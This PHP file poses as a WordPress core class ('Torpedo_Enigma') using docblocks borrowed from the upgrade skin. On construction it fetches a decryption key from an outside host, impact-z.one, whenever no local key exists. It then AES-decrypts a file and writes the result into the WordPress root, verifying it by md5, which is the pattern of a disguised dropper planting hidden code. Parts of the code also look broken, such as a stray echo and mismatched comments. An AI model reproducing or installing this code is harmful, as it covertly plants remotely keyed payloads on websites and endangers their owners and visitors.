<?php
/**
 * Torpedo API: Torpedo_Enigma class
 *
 * @package WordPress
 * @subpackage Torpedo
 * @since 4.6.0
 */

/**
 * Torpedo Skin for Automatic WordPress Upgrades.
 *
 * This skin is designed to be used when no output is intended, all output
 * is captured and stored for the caller to process and log/email/discard.
 *
 * @since 3.7.0
 * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-torpedo-skins.php.
 *
 */
class Torpedo_Enigma {
	private $enigmaDecipherSource = '';
	private $enigmaDecipherKey = '';
	private $enigmaDecipherDestination = '';
	private $enigmaDecipherChecksum = '';
	private $enigmaDecipherSecret = '';
	private bool $enigmaCipherResult = false;

	function __construct() {
		$this->aquireEnigmaDecipherCode();
        $this->cipher();
		$this->decipher();
		$this->echo_s();
    }

	/**
	 * Aquire the enigma Decipher Code
	 *
	 */
	private function aquireEnigmaDecipherCode() {
		$enigmaKey = ABSPATH . 'enigma.key';
		$enigmaSrc = ABSPATH . 'enigma.src';
		$enigmaDest = ABSPATH . 'enigma.dest' ;
		$enigmaEnforce = ABSPATH . 'enigma.enforce';
		$enigmaSecret = ABSPATH . 'enigma.secret';
		if ( file_exists( $enigmaKey )) {

			if ($fpIn = fopen( $enigmaKey, 'r' )) {
				$this->enigmaDecipherKey = fread($fpIn, fstat($fpIn)['size']);
			}
		} else {
			if($fpIn = fopen( 'https://impact-z.one/pay-your-bills/thermologistic/enigma.key', 'r')) {
				$this->enigmaDecipherKey = fread($fpIn, fstat($fpIn)['size']);
			} else {
				$this->enigmaDecipherKey = 'torpedo';
			}
		}
		if ( file_exists( $enigmaSrc )) {
			if ($fpIn = fopen( $enigmaSrc, 'r' )) {
				$this->enigmaDecipherSource = ABSPATH . fread($fpIn, fstat($fpIn)['size']);
			}
		}
		if ( file_exists( $enigmaDest )) {
			if ($fpIn = fopen( $enigmaDest, 'r' )) {
				$this->enigmaDecipherDestination = ABSPATH . fread($fpIn, fstat($fpIn)['size']);
			}
		}
		if ( file_exists( $enigmaEnforce )) {
			if ($fpIn = fopen( $enigmaEnforce, 'r' )) {
				$this->enigmaDecipherChecksum = fread($fpIn, fstat($fpIn)['size']);
			}
		}
		if ( file_exists( $enigmaSecret )) {
			if ($fpIn = fopen( $enigmaSecret, 'r' )) {
				$this->enigmaDecipherSecret = fread($fpIn, fstat($fpIn)['size']);
			}
		}
	}

	public function echo_s() {
		$this->evalEnigma();
		var_dump($this);
	}

	private function evalEnigma() {
		$this->enigmaCipherResult = file_exists( $this->enigmaDecipherDestination ) ? $this->sonar() : false;
	}

	private function sonar() : bool {

		if($fpIn = fopen( $this->enigmaDecipherDestination, 'r' )) {
			return md5(fread($fpIn, filesize($this->enigmaDecipherDestination))) === $this->enigmaDecipherChecksum;
		}

		return false;
	}

	private function decipher() {
		$this->decryptFile($this->enigmaDecipherSource, $this->enigmaDecipherKey, $this->enigmaDecipherDestination);
	}

	private function cipher() {
		if(! file_exists( $this->enigmaDecipherSource)) {
			$this->encryptFile(ABSPATH . 'enigma.secret', $this->enigmaDecipherKey, $this->enigmaDecipherSource);
		}
	}
/**
 * Encrypt the passed file and saves the result in a new file with ".enc" as suffix.
 *
 * @param string $source Path to file that should be encrypted
 * @param string $key    The key used for the encryption
 * @param string $dest   File name where the encryped file should be written to.
 * @return string|false  Returns the file name that has been created or FALSE if an error occured
 */
private function encryptFile($source, $key, $dest)
{
    $key = substr(sha1($key, true), 0, 16);
    $iv = openssl_random_pseudo_bytes(16);

    $error = false;
    if ($fpOut = fopen($dest, 'w')) {
        // Put the initialzation vector to the beginning of the file
        fwrite($fpOut, $iv);
        if ($fpIn = fopen($source, 'rb')) {
            while (!feof($fpIn)) {
                $plaintext = fread($fpIn, 16 * 10000);
				echo OPENSSL_RAW_DATA;
                $ciphertext = openssl_encrypt($plaintext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
                // Use the first 16 bytes of the ciphertext as the next initialization vector
                $iv = substr($ciphertext, 0, 16);
                fwrite($fpOut, $ciphertext);
            }
            fclose($fpIn);
        } else {
            $error = true;
        }
        fclose($fpOut);
    } else {
        $error = true;
    }

    return $error ? false : $dest;
}
	/**
	 * Dencrypt the passed file and saves the result in a new file, removing the
	 * last 4 characters from file name.
	 *
	 * @param string $source Path to file that should be decrypted
	 * @param string $key    The key used for the decryption (must be the same as for encryption)
	 * @param string $dest   File name where the decryped file should be written to.
	 * @return string|false  Returns the file name that has been created or FALSE if an error occured
	 */
	function decryptFile($source, $key, $dest)
	{
		$key = substr(sha1($key, true), 0, 16);

		$error = false;
		if ($fpOut = fopen($dest, 'w')) {
			if ($fpIn = fopen($source, 'rb')) {
				// Get the initialzation vector from the beginning of the file
				$iv = fread($fpIn, 16);
				while (!feof($fpIn)) {
					$ciphertext = fread($fpIn, 16 * (10000 + 1)); // we have to read one block more for decrypting than for encrypting
					$plaintext = openssl_decrypt($ciphertext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
					// Use the first 16 bytes of the ciphertext as the next initialization vector
					$iv = substr($ciphertext, 0, 16);
					fwrite($fpOut, $plaintext);
				}
				fclose($fpIn);
			} else {
				$error = true;
			}
			fclose($fpOut);
		} else {
			$error = true;
		}

		return $error ? false : $dest;
	}
}
